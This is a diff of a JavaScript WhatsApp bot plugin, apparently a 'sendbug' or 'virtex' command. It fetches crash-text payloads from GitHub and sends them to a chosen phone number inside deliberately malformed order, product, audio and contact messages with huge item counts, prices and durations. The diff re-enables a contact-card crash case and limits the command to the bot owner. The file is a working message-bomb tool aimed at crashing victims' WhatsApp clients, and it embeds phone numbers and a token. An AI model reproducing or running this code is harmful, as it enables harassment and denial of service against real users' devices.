@@ -1,12 +1,11 @@
-import pkg from '@adiwajshing/baileys'
+//Thanks To AyGemuy For This Feature
 import fs from 'fs'
 import fetch from 'node-fetch'
 import { sticker } from '../lib/sticker.js'
 
-const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = pkg
-
+const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <62XXXXXXXXXX>\n\n*Note :*\nGunakan Fitur Hanya Untuk Ripper Atau Scamer jangan pulak owner gw @${nomorown.split`@`[0]}`)
+	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nJangan Salah Menggunakan Fitur Ini!`)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
 	let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
@@ -14,10 +13,9 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 
 	const from = m.key.remoteJid
 	//const participants = m.isGroup ? await groupMetadata.participants : ''
-	let packname = 'WannTrue'
-	let q = `Bug Tag From HyzerDev\n${text}`
+	let q = `Bug Tag From ${author}\n${text}`
 	let sections = [{
-		title: `Recoded by ${packname}`,
+		title: `Created by ${packname2}`,
 		rows: [
 			{ title: 'Bug PDF', rowId: `${_p + command} pdf ${text}` },
 			{ title: 'Bug VN', rowId: `${_p + command} vn ${text}` },
@@ -25,16 +23,16 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			{ title: 'Bug Image', rowId: `${_p + command} bugimg ${text}` },
 			{ title: 'Bug Video', rowId: `${_p + command} bugvid ${text}` },
 			{ title: 'Bug Crash', rowId: `${_p + command} bugcrash ${text}` },
-			{ title: 'Bug Kontak ERROR❗', rowId: `${_p + command} bugkontak ${text}` },
+			{ title: 'Bug Kontak', rowId: `${_p + command} bugkontak ${text}` },
 			{ title: 'Bug ReactPc', rowId: `${_p + command} reactpc ${text}` },		
 			{ title: 'Bug Catalog', rowId: `${_p + command} bugcatalog ${text}` },
 			{ title: 'Bug TextCrash', rowId: `${_p + command} bugtextcrash ${text}` },
 		]
 	}]
 	let listMessage = {
-		text: '*[ List Bug ]*\n\n*Note :* Gunakan +62 dan isi nomor yg bener Bre ',
-		footer: packname,
-		buttonText: 'Silahkan Klik Bre',
+		text: '*[ List Bug ]*\n\n*Note :* Jangan Asal Kirim ke orang yg tidak bersalah',
+		footer: packname2,
+		buttonText: 'Silahkan Klik Di Sini',
 		sections
 	}
 
@@ -58,24 +56,24 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 		"orderMessage": {
 			"orderId": "594071395007984",
 			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
-			"itemCount": 100000000000,
+			"itemCount": fsizedoc,
 			"status": "INQUIRY",
 			"surface": "CATALOG",
 			"message": "",
 			"orderTitle": `${packname}`,
-			"sellerJid": "62857887347569@s.whatsapp.net",
+			"sellerJid": "6285736178354@s.whatsapp.net",
 			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
-			"totalAmount1000": "500000000000000",
+			"totalAmount1000": fsizedoc,
 			"totalCurrencyCode": "IDR"
 		}
 	}}
 	//#Troli 2
 	const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},
 	"message": {
-		orderMessage: { 		itemCount: 100000000000,
+		orderMessage: { 		itemCount: fsizedoc,
 			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `© ${packname}`,
 			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
-			totalAmount1000: "500000000000000",
+			totalAmount1000: fsizedoc,
 			totalCurrencyCode: "IDR",
 			orderTitle: `${packname} ${virus2}`,
 			sellerJid: '0@s.whatsapp.net'}}, 		contextInfo: { "forwardingScore":999,"isForwarded":true },
@@ -87,14 +85,14 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 		"orderMessage": {
 			"orderId": "594071395007984",
 			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
-			"itemCount": 100000000000,
+			"itemCount": fsizedoc,
 			"status": "INQUIRY",
 			"surface": "CATALOG",
 			"message": `${packname}`,
 			"orderTitle": `${packname}`,
-			"sellerJid": "62857887347569@s.whatsapp.net",
+			"sellerJid": "6285736178354@s.whatsapp.net",
 			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
-			"totalAmount1000": "500000000000000",
+			"totalAmount1000": fsizedoc,
 			"totalCurrencyCode": "IDR"
 		}
 	}}
@@ -119,8 +117,8 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 				"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
 				"mimetype": "audio/aac",
 				"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
-				"fileLength": "285473",
-				"seconds": 9999999999,
+				"fileLength": fsizedoc,
+				"seconds": fsizedoc,
 				"caption": `${packname}`,
 				"ptt": false,
 				"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
@@ -143,10 +141,10 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			"currencyCode": "IDR",
 			"bodyText": `${virus}`,
 			"footerText": `${packname}`,
-			"priceAmount1000": "10000000",
+			"priceAmount1000": fsizedoc,
 			"productImageCount": 1,
 			"firstImageId": 1,
-			"salePriceAmount1000": "10000000",
+			"salePriceAmount1000": fsizedoc,
 			"retailerId": `${packname}`,
 			"url": "wa.me/62881037044211"
 		},
@@ -204,11 +202,11 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 		}
 		break
-		/*case 'bugkontak': {
+		case 'bugkontak': {
 			let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
 				"contactMessage": {
 					"vcard": "HAHaAhHAHAHA",
-					"displayName": `HyzerDev`,
+					"displayName": `${author}`,
 					"contextInfo": {
 						"forwardingScore": 3,
 						"isForwarded": true
@@ -218,7 +216,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			conn.relayWAMessage(res)
 			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 		}
-		break*/
+		break
 		case 'reactpc': {
 			await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${packname}` }, {quoted: trol})
 			//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
@@ -248,8 +246,10 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 }
 
-handler.help = ['sendbugs <nomer>']
-handler.tags = ['main']
-handler.command = /^((send)?(bugs?|virtex|virus))$/i
+handler.help = ['sendbug <nomer>']
+handler.tags = ['owner']
+handler.command = /^((send)?(bug?|virtex|virus))$/i
+
+handler.owner = true
 
 export default handler
